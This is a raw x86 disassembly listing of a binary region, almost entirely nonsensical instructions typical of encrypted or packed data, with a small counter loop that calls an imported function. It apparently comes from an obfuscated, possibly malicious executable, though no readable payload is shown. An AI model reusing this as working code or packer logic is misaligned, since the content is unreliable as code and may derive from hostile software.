  41104f:	mov    ebx,0xc92b9711
  411054:	xchg   esp,eax
  411055:	in     eax,0x57
  411057:	mov    ch,0xac
  411059:	xlat   BYTE PTR ds:[ebx]
  41105a:	sbb    BYTE PTR [esi],ch
  41105c:	neg    BYTE PTR [ecx]
  41105e:	or     eax,0x65be01d3
  411063:	dec    edx
  411064:	fdiv   DWORD PTR [eax+0x1a065326]
  41106b:	stos   DWORD PTR es:[edi],eax
  41106c:	jmp    0x875e:0xcf1e67eb
  411073:	pop    DWORD PTR [eax-0x27]
  411076:	in     al,0xfa
  411078:	sbb    BYTE PTR [edi+0x36],cl
  41107b:	arpl   WORD PTR [eax],sp
  41107d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41107e:	jb     0x411060
  411080:	mov    WORD PTR [ebp+0x542cc87d],?
  411086:	xchg   esp,eax
  411087:	adc    DWORD PTR [edx*1+0x3cec98e5],edx
  41108e:	pop    ecx
  41108f:	mov    eax,ds:0xd468782e
  411094:	cli    
  411095:	lods   al,BYTE PTR ds:[esi]
  411096:	bound  ecx,QWORD PTR [ebx]
  411098:	xlat   BYTE PTR ds:[ebx]
  411099:	push   edi
  41109a:	mov    dh,0x8b
  41109c:	mov    edx,0x8be6d011
  4110a1:	and    esi,0xb6b9a32f
  4110a7:	pop    edi
  4110a8:	inc    esi
  4110a9:	shl    DWORD PTR [ecx+eax*4-0x14abf657],1
  4110b0:	jecxz  0x4110f6
  4110b2:	inc    ebx
  4110b3:	sbb    al,0xfc
  4110b5:	ret    
  4110b6:	adc    cl,BYTE PTR [esi+0x3bdaf41d]
  4110bc:	pop    ebx
  4110bd:	mov    ds:0xdf2a4b09,eax
  4110c2:	xchg   ebx,eax
  4110c3:	or     eax,0x278ac4e5
  4110c8:	jmp    0xcfbd0ea6
  4110cd:	jo     0x4110be
  4110cf:	pop    ds
  4110d0:	bound  ebp,QWORD PTR [esi-0x26814472]
  4110d6:	inc    esi
  4110d8:	sbb    DWORD PTR [ebp+0x529b0269],edi
  4110de:	ja     0x4110a4
  4110e0:	dec    ecx
  4110e1:	mov    edi,0x756fdea7
  4110e6:	xor    BYTE PTR [ebp-0x3b],0x75
  4110ea:	pusha  
  4110eb:	pop    edi
  4110ec:	lods   eax,DWORD PTR ds:[esi]
  4110ed:	pop    ebx
  4110ee:	shr    BYTE PTR [esi],0x35
  4110f1:	xchg   ebp,eax
  4110f2:	jae    0x4110da
  4110f4:	bound  ecx,QWORD PTR [edi-0x7983a54d]
  4110fa:	call   0xe38a:0xa4a665ff
  411101:	psrlq  mm2,mm2
  411104:	imul   edx,DWORD PTR [ecx],0xffffff9a
  411107:	mov    bh,0x5e
  411109:	push   ss
  41110a:	push   esp
  41110b:	inc    ebx
  41110c:	dec    ecx
  41110d:	push   0xd648dca9
  411112:	mov    esi,0xf5498394
  411117:	pop    ecx
  411118:	pop    es
  411119:	imul   esi,DWORD PTR [ebp+0x3cef0905],0xdebcb9fc
  411123:	dec    edi
  411124:	pop    ds
  411125:	stos   DWORD PTR es:[edi],eax
  411126:	enter  0x58c4,0xf2
  41112a:	xor    cl,bl
  41112c:	test   edx,0x8be3eff6
  411132:	jo     0x4110fb
  411134:	fadd   QWORD PTR [edx-0x7cd2900d]
  41113a:	push   ebp
  41113b:	nop
  41113c:	ret    0xa443
  41113f:	int    0xea
  411141:	bound  edi,QWORD PTR [edi-0x1f]
  411144:	call   0x3233400d
  411149:	jne    0x411195
  41114b:	pop    ss
  41114c:	sub    al,0x6
  41114f:	jge    0x4111bb
  411151:	or     DWORD PTR [eax-0x7d1e579e],0x4d
  411158:	xchg   esp,eax
  411159:	jmp    0x411163
  41115b:	jle    0x4111ca
  41115d:	inc    DWORD PTR [eax]
  41115f:	es sti 
  411161:	scas   eax,DWORD PTR es:[edi]
  411162:	retf   0xe98c
  411165:	push   eax
  411166:	pop    ebx
  411167:	retf   
  411168:	shl    DWORD PTR [eax],cl
  41116a:	repz fstp TBYTE PTR [eax+0x3e]
  41116e:	or     dl,dh
  411170:	jno    0x4111b2
  411172:	mov    cs,WORD PTR ss:[eax+ecx*4-0x59]
  411177:	sbb    eax,0xbf9a48e8
  41117c:	mov    ah,0xfa
  41117e:	mov    bh,0x8a
  411180:	call   FWORD PTR [ecx*1-0x62fa679d]
  411187:	sub    edx,DWORD PTR [ebx-0x30]
  41118a:	mov    edi,0xaf41b2f2
  41118f:	push   eax
  411190:	in     al,0x16
  411192:	das    
  411193:	mov    ah,0xcc
  411195:	cmc    
  411196:	(bad)  
  411197:	ins    BYTE PTR es:[edi],dx
  411198:	sub    dl,BYTE PTR [ebp-0x1c7b89e6]
  41119e:	dec    esi
  41119f:	mov    ch,0x38
  4111a1:	out    0x9e,eax
  4111a3:	jmp    0x6d864256
  4111a8:	retf   0xcbad
  4111ab:	loop   0x4111a6
  4111ad:	fidiv  DWORD PTR [eax]
  4111af:	add    cl,BYTE PTR [ebx+0x50d81c93]
  4111b5:	dec    ebp
  4111b6:	or     dh,ch
  4111b8:	jb     0x41121b
  4111ba:	les    ebx,FWORD PTR [ebx-0x10feb371]
  4111c0:	and    al,0xf5
  4111c2:	arpl   cx,sp
  4111c4:	xchg   ebp,eax
  4111c5:	(bad)  
  4111c6:	ja     0x411213
  4111c8:	cs adc ecx,edx
  4111cb:	dec    esi
  4111cc:	imul   esp,DWORD PTR [esi+0x751e720a],0x45
  4111d3:	adc    esp,eax
  4111d5:	jle    0x411242
  4111d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111d8:	jmp    0x5f3b:0x7e9517d8
  4111df:	pop    ds
  4111e0:	aam    0x7c
  4111e2:	in     al,0xbd
  4111e4:	or     eax,DWORD PTR [edx+0x38]
  4111e7:	retf   0x8630
  4111ea:	test   DWORD PTR [edi],esi
  4111ec:	les    edx,FWORD PTR [ebx+0xec0f435]
  4111f2:	mov    dh,0x98
  4111f4:	push   es
  4111f5:	shr    BYTE PTR [eax+0x61],1
  4111f8:	push   0xffffff97
  4111fa:	test   DWORD PTR [esi+edx*4],edx
  4111fd:	push   DWORD PTR ds:0x9b3ed68
  411203:	repnz xchg esp,eax
  411205:	mov    ds:0x7e2068fa,al
  41120a:	out    dx,al
  41120b:	push   DWORD PTR [esi+0x68]
  41120e:	(bad)  [edx-0x2c1e540]
  411214:	sbb    al,0xe2
  411216:	mov    bl,0xd1
  411218:	dec    esp
  411219:	daa    
  41121a:	in     eax,dx
  41121b:	lahf   
  41121c:	jbe    0x411203
  41121e:	inc    esp
  41121f:	das    
  411220:	fisub  DWORD PTR [ecx-0x4af4fcf7]
  411226:	mov    al,ds:0xe2945360
  41122b:	jmp    0x910e:0xac3b160f
  411232:	out    dx,eax
  411233:	pushf  
  411234:	pop    edi
  411235:	add    ecx,eax
  411237:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411238:	pusha  
  411239:	rol    BYTE PTR [ebp+0x1],1
  41123c:	push   eax
  41123d:	adc    al,0x59
  41123f:	mov    edx,0x3f89a2a6
  411244:	push   ecx
  411245:	in     al,dx
  411246:	sub    eax,DWORD PTR [edi]
  411248:	shl    DWORD PTR [ebp+0x4a],cl
  41124b:	pop    ds
  41124c:	into   
  41124d:	jb     0x411204
  41124f:	adc    BYTE PTR [edx],0x9e
  411252:	pusha  
  411253:	addr16 pop ebx
  411255:	mov    ch,0x5d
  411257:	xor    al,0x8e
  411259:	stc    
  41125a:	sti    
  41125b:	push   ecx
  41125c:	dec    ecx
  41125d:	sub    eax,0x9df75f08
  411262:	push   esi
  411263:	(bad)  
  411265:	sbb    ch,dh
  411267:	xor    esp,DWORD PTR [ebx-0x6ea727d6]
  41126d:	and    DWORD PTR [edi+0x6731feec],0xffffffff
  411274:	mov    al,ds:0xa849a81b
  411279:	cmp    eax,0x7ea58f90
  41127e:	les    ebx,FWORD PTR [esi+ebx*8-0x35003875]
  411285:	or     al,0x6e
  411287:	cmp    al,0x90
  411289:	fldenv [esi-0x6]
  41128c:	sbb    ebx,DWORD PTR [ebx]
  41128e:	adc    dh,ch
  411290:	sub    al,0xf0
  411292:	push   0x40451cf7
  411297:	push   ebp
  411298:	sub    dh,BYTE PTR [ecx-0x662afcfe]
  41129e:	add    ebp,edi
  4112a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112a1:	adc    bh,BYTE PTR [ebx]
  4112a3:	pop    es
  4112a4:	sbb    eax,0xa95329ce
  4112a9:	xchg   DWORD PTR [edx+ecx*8-0x1],ebp
  4112ad:	sub    eax,DWORD PTR [eax+edi*8+0x3e03179a]
  4112b4:	lea    esp,[esi]
  4112b6:	pop    ss
  4112b7:	stos   DWORD PTR es:[edi],eax
  4112b8:	in     eax,0x81
  4112ba:	lea    ecx,[ecx]
  4112bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112bd:	jnp    0x4112a8
  4112bf:	mov    al,0x78
  4112c1:	das    
  4112c2:	out    0x38,al
  4112c4:	sub    ah,ch
  4112c6:	xor    bh,cl
  4112c8:	or     bl,BYTE PTR [edx-0x6c]
  4112cb:	ins    DWORD PTR es:[edi],dx
  4112cc:	or     BYTE PTR [ecx+0xc],bl
  4112cf:	adc    dh,BYTE PTR [ebx]
  4112d1:	data16 in al,dx
  4112d3:	into   
  4112d4:	outs   dx,DWORD PTR ds:[esi]
  4112d5:	outs   dx,DWORD PTR ds:[esi]
  4112d6:	adc    DWORD PTR [esi-0x25],ebx
  4112d9:	or     eax,DWORD PTR [ebp-0x18393f45]
  4112df:	pop    es
  4112e0:	xor    bl,BYTE PTR [ebx-0x22]
  4112e3:	adc    DWORD PTR [ebp+0x54],esp
  4112e6:	dec    eax
  4112e7:	jnp    0x41134e
  4112e9:	pop    ecx
  4112ea:	lahf   
  4112eb:	mov    ebx,0xb3362fe5
  4112f0:	adc    eax,0xbe48308f
  4112f5:	cmp    dl,BYTE PTR [esi]
  4112f7:	pop    ecx
  4112f8:	cmp    al,0x1a
  4112fa:	fcom   st(1)
  4112fc:	inc    esi
  4112fd:	dec    DWORD PTR [edi-0x23b6a27c]
  411303:	sub    DWORD PTR [eax+0x55],esi
  411306:	adc    esi,ebx
  411308:	jecxz  0x41137c
  41130a:	in     eax,0x86
  41130c:	out    0xc7,eax
  41130e:	ss pop edi
  411310:	repnz mov bl,0xd7
  411313:	adc    al,BYTE PTR [esi]
  411315:	stos   BYTE PTR es:[edi],al
  411316:	loope  0x41132b
  411318:	mov    ecx,0x123e951
  41131d:	(bad)  [eax+0x480858d]
  411323:	pop    ds
  411324:	push   ds
  411325:	(bad)  
  411326:	out    0xb3,al
  411328:	pop    eax
  411329:	pop    ds
  41132a:	dec    eax
  41132b:	or     BYTE PTR [eax],cl
  41132d:	rol    DWORD PTR [edi],0x56
  411330:	stos   BYTE PTR es:[edi],al
  411331:	out    dx,eax
  411332:	add    al,0x27
  411334:	lock lahf 
  411336:	xchg   ebx,eax
  411337:	test   eax,0xdc97d1e9
  41133c:	out    dx,al
  41133d:	dec    esi
  41133e:	inc    ebp
  41133f:	cld    
  411340:	jns    0x411354
  411342:	jmp    0x97cb4be2
  411347:	stos   DWORD PTR es:[edi],eax
  411348:	aad    0x83
  41134a:	adc    DWORD PTR [ecx],edi
  41134c:	div    DWORD PTR [ebp-0x4c8fd94a]
  411352:	stc    
  411353:	add    DWORD PTR [ecx+0x23],0xffffffae
  411357:	popa   
  411358:	cmp    ah,ah
  41135a:	sub    al,0x6f
  41135c:	lock jge 0x411353
  41135f:	inc    edi
  411360:	or     bl,BYTE PTR es:[ecx+ebx*2+0x29]
  411365:	mov    cl,0xc8
  411367:	push   ds
  411368:	cs push ecx
  41136a:	dec    edx
  41136b:	xor    al,BYTE PTR [edx+ebp*4]
  41136e:	repnz mov al,0x1c
  411371:	call   DWORD PTR [edi-0x3597c1d0]
  411377:	fcomp  st(5)
  411379:	aaa    
  41137a:	jmp    0x3eac048a
  41137f:	push   0xb49a923c
  411384:	add    esp,DWORD PTR [esi-0x7d]
  411387:	imul   eax,DWORD PTR [edx],0x21d6b433
  41138d:	mov    ecx,0xf88f9fd5
  411392:	lahf   
  411393:	inc    esi
  411394:	hlt    
  411395:	xchg   esi,eax
  411396:	sbb    al,0xad
  411398:	enter  0xf6e1,0x10
  41139c:	dec    esp
  41139d:	(bad)  
  41139f:	jne    0x41137b
  4113a1:	push   ds
  4113a2:	xor    al,dl
  4113a4:	frstor ss:[eax]
  4113a7:	cmp    BYTE PTR [ecx+0x5f],bh
  4113aa:	cmc    
  4113ab:	ja     0x411375
  4113ad:	pop    ebx
  4113ae:	inc    esp
  4113af:	je     0x411349
  4113b1:	and    eax,0x69f9316d
  4113b6:	sti    
  4113b7:	or     al,0xb9
  4113b9:	dec    ebx
  4113ba:	jae    0x4113f3
  4113bc:	xor    DWORD PTR ds:0xa8e2ff9d,eax
  4113c2:	mov    eax,DWORD PTR [edx+0x3b]
  4113c5:	mov    bh,0x5
  4113c8:	jno    0x4113c7
  4113ca:	inc    edx
  4113cb:	add    ah,ah
  4113cd:	js     0x4113cf
  4113cf:	add    BYTE PTR [edi],cl
  4113d1:	test   ah,al
  4113d3:	or     BYTE PTR [eax],al
  4113d5:	add    BYTE PTR [ecx+0x41b224],ah
  4113db:	and    DWORD PTR ds:0x42fdfa,0x0
  4113e5:	mov    esi,DWORD PTR ds:0x42fdfa
  4113eb:	inc    esi
  4113ec:	mov    DWORD PTR ds:0x42fdfa,esi
  4113f2:	cmp    DWORD PTR ds:0x42fdfa,0x8
  4113f9:	jne    0x41140f
  4113ff:	push   0x42e267
  411404:	push   0x42e2ed
  411409:	call   DWORD PTR ds:0x42e5e7
  41140f:	cmp    DWORD PTR ds:0x42fdfa,0x7
  411416:	jne    0x411429
  41141c:	mov    esi,DWORD PTR ds:0x42fdfa
  411422:	inc    esi
  411423:	mov    DWORD PTR ds:0x42fdfa,esi
  411429:	cmp    DWORD PTR ds:0x42fdfa,0x13
  411430:	jb     0x4113e5
  411436:	jmp    0x41183b
  41143b:	and    cl,al
  41143d:	leave  
  41143e:	adc    ch,cl
  411440:	adc    ecx,esp
  411442:	call   0xcb53bead
  411447:	or     BYTE PTR [esi+0x77],cl
  41144a:	xchg   ebx,eax
  41144b:	push   cs
  41144c:	dec    edx
  41144d:	jo     0x4114bf
  41144f:	pop    eax
  411450:	jge    0x4114c2
  411452:	jo     0x41142d
  411454:	lods   eax,DWORD PTR ds:[esi]
  411455:	inc    ecx
  411456:	call   0x2a8d1f5c
  41145b:	push   edx
  41145c:	jnp    0x4113fb
  41145e:	mov    bl,0xc5
  411460:	in     eax,dx
  411461:	dec    ebp
  411462:	rcl    BYTE PTR [ecx-0x5308cfb4],0x9a
  411469:	lds    edi,FWORD PTR gs:[edi]
  41146c:	sbb    al,0xfd
  41146e:	std    
  41146f:	das    
  411470:	leave  
  411471:	jbe    0x411432
  411473:	out    dx,al
  411474:	xor    al,0xba
  411476:	fldenv [edx-0x1f]
  411479:	loop   0x411488
  41147b:	inc    esp
  41147c:	or     BYTE PTR [ecx-0x42],al
  41147f:	cmp    bh,BYTE PTR [ebx]
  411481:	idiv   BYTE PTR [ebx-0x73]
  411484:	nop
  411485:	test   DWORD PTR [eax],eax
  411487:	jl     0x411433
  411489:	sub    ah,0x9e
  41148c:	push   ds
  41148d:	inc    ebx
  41148e:	push   edi
  41148f:	call   0x181c:0xd0f69421
  411496:	leave  
  411497:	jne    0x4114b1
  411499:	rcr    dh,1
  41149b:	mov    dl,BYTE PTR [eax+0x49]
  41149e:	test   BYTE PTR [ebp+0x2c2b32f4],0x3b
  4114a5:	(bad)  
  4114a6:	rol    BYTE PTR [ebx-0x3c],cl
  4114a9:	mov    ds,WORD PTR [esi+0x67]
  4114ac:	mov    ecx,0xd1a7573b
  4114b1:	mov    ebx,0x9d836741
  4114b6:	not    BYTE PTR [edi]
  4114b8:	jg     0x411502
  4114ba:	ret    0x1aba
  4114bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114be:	mov    bl,0x9a
  4114c0:	out    0xb2,eax
  4114c2:	or     DWORD PTR [esi+0x81a3c6a],eax
  4114c8:	mov    bh,0xf7
  4114ca:	sar    BYTE PTR [eax+0x2e34dd2],0x8
  4114d1:	push   edi
  4114d2:	pop    edi
  4114d3:	cld    
  4114d4:	(bad)  
  4114d5:	jle    0x4114b8
  4114d7:	cld    
  4114d8:	imul   eax,DWORD PTR ds:0xb49d752e,0x11
  4114df:	outs   dx,DWORD PTR ds:[esi]
  4114e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114e1:	sbb    dh,BYTE PTR [ebp-0x227d522d]
  4114e7:	gs pop ebx
  4114e9:	xchg   esi,eax
  4114ea:	fild   QWORD PTR [ebx+0x1d4ccef7]
  4114f0:	int    0x2b
  4114f2:	pop    edi
  4114f3:	pusha  
  4114f4:	mov    bl,0x9e
  4114f6:	push   0x7d75a8a4
  4114fb:	mov    fs:0x7698184c,eax
  411501:	lods   al,BYTE PTR ds:[esi]
  411502:	int3   
  411503:	inc    ebx
  411504:	or     DWORD PTR [edx],0xb9be2287
  41150a:	sbb    ch,BYTE PTR [ebp-0x26b949a7]
  411510:	jb     0x4114d9
  411512:	sub    ch,cl
  411514:	cwde   
  411515:	in     al,dx
  411516:	in     al,dx
  411517:	mov    eax,ds:0x298eb15d
  41151c:	sbb    eax,0xff940f99
  411521:	mov    esi,0xf371821b
  411526:	push   es
  411527:	(bad)  
  411528:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411529:	pop    esi
  41152a:	inc    eax
  41152b:	stc    
  41152c:	lock mov ds:0xda71677f,eax
  411532:	stc    
  411533:	push   esp
  411534:	test   eax,0xfd1776f1
  411539:	popf   
  41153a:	out    dx,eax
  41153b:	(bad)  
  41153c:	pop    ebp
  41153d:	xlat   BYTE PTR ds:[ebx]
  41153e:	loope  0x4114c5
  411540:	push   ebx
  411541:	and    BYTE PTR [esp+eiz*4-0x413059b5],0x4d
  411549:	cmc    
  41154a:	cmp    ebp,eax
  41154c:	mov    edx,0xdb8edb72
  411551:	imul   esi,DWORD PTR [eax-0x59],0x7a
  411555:	loopne 0x411570
  411557:	lods   al,BYTE PTR ds:[esi]
  411558:	(bad)  
  41155a:	mov    cs,WORD PTR [ecx]
  41155c:	or     eax,0xda7fbf4c
  411561:	mov    cl,0x1b
  411563:	retf   0x26e5
  411566:	jle    0x41150c
  411568:	cwde   
  411569:	idiv   DWORD PTR [edi+0x5523f273]
  41156f:	pop    edx
  411570:	jl     0x4115c6
  411572:	inc    ebx
  411573:	loopne 0x4115d7
  411575:	in     eax,dx
  411576:	dec    ebp
  411577:	sbb    al,0x86
  411579:	ret    0xc22c
  41157c:	fwait
  41157d:	sub    DWORD PTR [ebx-0x14],esi
  411580:	pop    ds
  411581:	pop    es
  411582:	lahf   
  411583:	pop    ecx
  411584:	test   al,0x95
  411586:	mov    ebx,0xd27a227d
  41158b:	mov    eax,ebx
  41158d:	adc    al,0x3d
  41158f:	push   eax
  411590:	jae    0x411579
  411592:	or     ebp,DWORD PTR [ebp-0xf]
  411595:	sub    DWORD PTR [ebp+0x15],ebx
  411598:	xchg   BYTE PTR [ecx+eax*4-0x4b],bl
  41159c:	mov    al,ds:0x6f97be82
  4115a1:	sbb    BYTE PTR [esi-0x5c],cl
  4115a4:	adc    dh,ah
  4115a6:	nop
  4115a7:	push   es
  4115a8:	out    0xd2,eax
  4115aa:	and    DWORD PTR [ebx-0x6dd1fd9c],edi
  4115b0:	call   0xf438:0xddfc6a75
  4115b7:	push   esi
  4115b8:	lods   al,BYTE PTR ds:[esi]
  4115b9:	pusha  
  4115ba:	fwait
  4115bb:	mov    cl,0xa6
  4115bd:	ucomiss xmm2,DWORD PTR [edx+ebx*2]
  4115c1:	into   
  4115c2:	into   
  4115c3:	loopne 0x41154f
  4115c5:	sub    dh,BYTE PTR [esi-0x5a]
  4115c8:	dec    esi
  4115c9:	xchg   ebx,eax
  4115ca:	adc    DWORD PTR [edi-0x13],ebp
  4115cd:	pop    ecx
  4115ce:	dec    esp
  4115cf:	and    eax,0xb9f1bf39
  4115d4:	add    eax,0xd370a961
  4115d9:	xchg   ecx,eax
  4115da:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4115dc:	shl    al,cl
  4115de:	or     al,0xf2
  4115e0:	or     edi,edi
  4115e2:	pop    esp
  4115e3:	mov    WORD PTR [esi-0x75],es
  4115e6:	mov    edi,0x75c04068
  4115eb:	out    dx,al
  4115ec:	stos   DWORD PTR es:[edi],eax
  4115ed:	neg    DWORD PTR [ebp+0x11]
  4115f0:	fwait
  4115f1:	not    DWORD PTR [edi-0x4]
  4115f4:	stos   BYTE PTR es:[edi],al
  4115f5:	push   ds
  4115f6:	lahf   
  4115f7:	ror    cl,cl
  4115f9:	fcomp  st(4)
  4115fb:	test   BYTE PTR cs:[edi+eiz*1+0x6b],dl
  411600:	into   
  411601:	mov    ch,BYTE PTR [esi+0x66a8aaef]
  411607:	sub    DWORD PTR [esi],eax
  411609:	icebp  
  41160a:	sar    DWORD PTR [edi-0x75],1
  41160d:	arpl   di,ax
  41160f:	nop
  411610:	add    BYTE PTR [edx-0x70],al
  411613:	mov    dh,0x36
  411615:	mov    ecx,0xa3b56468
  41161a:	jmp    0x7f81:0x801c7bc4
  411621:	lods   eax,DWORD PTR ds:[esi]
  411622:	icebp  
  411623:	ficom  WORD PTR [esi]
  411625:	ss mov bh,dh
  411628:	or     eax,0x26c29d1a
  41162d:	cmp    DWORD PTR [ebx-0x35990879],edi
  411633:	or     dh,BYTE PTR [ebx-0x248c8e3c]
  411639:	retf   
  41163a:	jecxz  0x41168d
  41163c:	add    BYTE PTR [esi+0x4e],al
  41163f:	shr    DWORD PTR [ebx],cl
  411641:	push   DWORD PTR [ebp+0x1b5c7a77]
  411647:	push   0xffffff83
  411649:	jmp    0xcdb3d26a
  41164e:	lods   eax,DWORD PTR ds:[esi]
  41164f:	shr    ebx,cl
  411651:	scas   eax,DWORD PTR es:[edi]
  411652:	cli    
  411653:	mov    ch,0x3a
  411655:	fsubr  QWORD PTR [esi+esi*2+0x9]
  411659:	sti    
  41165a:	mov    esi,0xa53cf237
  41165f:	in     al,dx
  411660:	xchg   esi,eax
  411661:	imul   edi,DWORD PTR [eax-0x4e],0xc388d243
  411668:	xchg   edi,eax
  411669:	xchg   ebp,eax
  41166a:	int3   
  41166b:	(bad)  
  41166c:	push   edi
  41166d:	outs   dx,BYTE PTR ds:[esi]
  41166e:	lds    ebp,FWORD PTR [eax-0x69380b72]
  411674:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411675:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411676:	ds sahf 
  411678:	sub    al,0x28
  41167a:	data16 mov al,ds:0xea7565e0
  411680:	fld    DWORD PTR [esi-0x14]
  411683:	xchg   BYTE PTR [esi+ebx*2-0x7e],dh
  411687:	pop    eax
  411688:	data16 sti 
  41168a:	outs   dx,BYTE PTR ds:[esi]
  41168b:	div    BYTE PTR ss:[eax+0x4f5ae698]
  411692:	and    eax,0x2b5a382d
  411697:	out    0x27,al
  411699:	adc    ecx,DWORD PTR ss:[ebx-0x3b]
  41169d:	inc    ebx
  41169e:	push   0xffffff9c
  4116a0:	sgdtd  [edx+0x38f726cf]
  4116a7:	cmp    DWORD PTR [eax+0x5131f713],ebp
  4116ad:	adc    bl,BYTE PTR [eax]
  4116af:	out    dx,al
  4116b0:	lea    esp,[esi+0x2b85cef9]
  4116b6:	pop    edi
  4116b7:	std    
  4116b8:	adc    BYTE PTR [edx-0x42],0x5c
  4116bc:	sbb    BYTE PTR [edx-0x35795241],0x47
  4116c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116c4:	add    ecx,ebx
  4116c6:	in     al,dx
  4116c7:	mov    BYTE PTR [esp+ecx*2+0x3516fb12],al
  4116ce:	(bad)
  4116d1:	pop    eax
  4116d2:	repz stc 
  4116d4:	or     bl,ah
  4116d6:	push   cs
  4116d7:	add    al,0x34
  4116d9:	outs   dx,BYTE PTR ds:[esi]
  4116da:	jns    0x411758
  4116dc:	or     BYTE PTR [ebx],ah
  4116de:	nop
  4116df:	and    edx,DWORD PTR [ecx]
  4116e1:	daa    
  4116e2:	bound  ebp,QWORD PTR [eax+0x5d78ca8f]
  4116e8:	dec    ecx
  4116e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116ea:	and    al,0x64
  4116ec:	ret    0x5dce
  4116ef:	mov    dl,0x5f
  4116f1:	inc    ebx
  4116f2:	jecxz  0x411692
  4116f4:	imul   edx,DWORD PTR [esi+0xc],0xffffffd0
  4116f8:	mov    ebp,DWORD PTR [eax+eiz*1]
  4116fb:	inc    ebp
  4116fc:	(bad)  
  4116fd:	mov    bh,0xd8
  4116ff:	fimul  DWORD PTR [edi-0x7addad73]
  411705:	ins    DWORD PTR es:[edi],dx
  411706:	or     al,0xd7
  411708:	out    0xbc,al
  41170a:	daa    
  41170b:	xchg   DWORD PTR [eax+0x11],ebp
  41170e:	jb     0x4116ed
  411710:	xchg   edi,eax
  411711:	push   esi
  411712:	sahf   
  411713:	fcmovu st,st(7)
  411715:	mov    ch,0x70
  411717:	pop    ss
  411718:	sbb    BYTE PTR [eax],bh
  41171a:	jg     0x4116b2
  41171c:	outs   dx,DWORD PTR ds:[esi]
  41171d:	mov    edx,0x1ec6885d
  411722:	sub    BYTE PTR [edi],ch
  411724:	jae    0x41174a
  411726:	lock aad 0x44
  411729:	sub    cl,ah
  41172b:	sub    al,0xcc
  41172d:	(bad)  
  41172e:	lea    edi,[esi]
  411730:	jmp    0x15ce:0xd5dd8f81
  411737:	sbb    BYTE PTR [eax],dh
  411739:	xchg   esp,eax
  41173a:	sub    edx,DWORD PTR [eax-0x192121d2]
  411740:	mov    edi,0xe72d1a29
  411745:	cdq    
  411746:	in     al,0x41
  411748:	stc    
  411749:	xor    ah,BYTE PTR [edi-0x7e]
  41174c:	jmp    0x4116f7
  41174e:	pushf  
  41174f:	mov    esp,DWORD PTR [eax]
  411751:	ret    0x5ce8
  411754:	out    0xa5,eax
  411756:	leave  
  411757:	cmc    
  411758:	(bad)  
  411759:	or     DWORD PTR [ebp+0x1ee1edf9],edx
  41175f:	dec    ebx
  411760:	das    
  411761:	xlat   BYTE PTR ds:[ebx]
  411762:	sbb    ebp,DWORD PTR [edx+0x495e80d3]
  411768:	push   ebp
  411769:	mov    al,0x7e
  41176b:	je     0x411764
  41176d:	mov    ecx,ebx
  41176f:	test   DWORD PTR [ebx+ebx*2],eax
  411772:	and    ch,BYTE PTR [ebx-0xf]
  411775:	outs   dx,DWORD PTR ds:[esi]
  411776:	dec    esp
  411777:	jg     0x41174f
  411779:	bound  eax,QWORD PTR [esi+0x71]
  41177c:	idiv   al
  41177e:	adc    bl,BYTE PTR [eax+ecx*1-0x7105010a]
  411785:	ins    DWORD PTR es:[edi],dx
  411786:	adc    BYTE PTR [ebx+edx*2],bh
  411789:	(bad)  
  41178a:	cmp    al,BYTE PTR es:[ecx+0x4b8a54ca]
  411791:	and    BYTE PTR [ebx],0xc6
  411794:	jbe    0x411747
  411796:	popa   
  411797:	mov    bl,0x12
  411799:	mov    ds:0x42b1a3f4,eax
  41179e:	fwait
  41179f:	sbb    DWORD PTR [bp+di],ecx
  4117a2:	fwait
  4117a3:	aaa    
  4117a4:	lahf   
  4117a5:	mov    DWORD PTR [ecx+0x2d],ecx
  4117a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117a9:	or     BYTE PTR [edx+0x76c8006d],cl
  4117af:	mov    gs:0xb5506915,eax
  4117b5:	add    al,0x9c
  4117b7:	mov    ch,BYTE PTR [edx]
  4117b9:	xor    dl,BYTE PTR [eax+0x185b3118]
  4117bf:	push   ebp
  4117c0:	iret   
  4117c1:	aad    0x30
  4117c3:	imul   esi,DWORD PTR [esi-0x3a83379a],0x9f32c5ea
  4117cd:	mov    al,ds:0x5b282677
  4117d2:	pop    ecx
  4117d3:	shl    DWORD PTR [esi+0x1c442dc9],0x9a
  4117da:	out    dx,al
  4117db:	fs push ss
  4117dd:	out    dx,al
  4117de:	xchg   edi,eax
  4117df:	jmp    0x1d7c:0x2a3c5ae9
  4117e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117e7:	(bad)  [ebp+edi*2-0xc]
  4117eb:	cld    
  4117ec:	cwde   
  4117ed:	les    ecx,FWORD PTR [edx+0xc]
  4117f0:	pusha  
  4117f1:	(bad)  
  4117f3:	cmc    
  4117f4:	xchg   bh,ah
  4117f6:	gs inc esp
  4117f8:	out    0x5d,eax
  4117fa:	mov    eax,0x1750f90
  4117ff:	cmp    dl,BYTE PTR [ecx]
  411801:	out    dx,eax
  411802:	shl    al,1
  411804:	nop
  411805:	gs dec esp
  411807:	mov    ?,WORD PTR [ebx+0x7d556a72]
  41180d:	mov    ebp,0xa05e3c17
  411812:	pushf  
  411813:	sub    edi,DWORD PTR [ecx-0x44970a85]
  411819:	outs   dx,DWORD PTR ds:[esi]
  41181a:	pop    ss
  41181b:	out    dx,al
  41181c:	iret   
  41181d:	jno    0x411820
  41181f:	loope  0x4117f0
  411821:	jbe    0x411847
  411823:	lds    ebp,FWORD PTR [eax-0x6f]
  411826:	push   edx
  411827:	dec    esi
  411828:	retf   0x4c78
  41182b:	outs   dx,DWORD PTR ds:[esi]
  41182c:	hlt    
  41182d:	cmp    BYTE PTR [ebp-0x2b],dh
  411830:	loope  0x4117ec
  411832:	ret    
  411833:	shl    DWORD PTR [esi],cl
  411835:	ins    DWORD PTR es:[edi],dx
  411836:	mov    al,0x5c
  411838:	sbb    eax,0x758b48c9
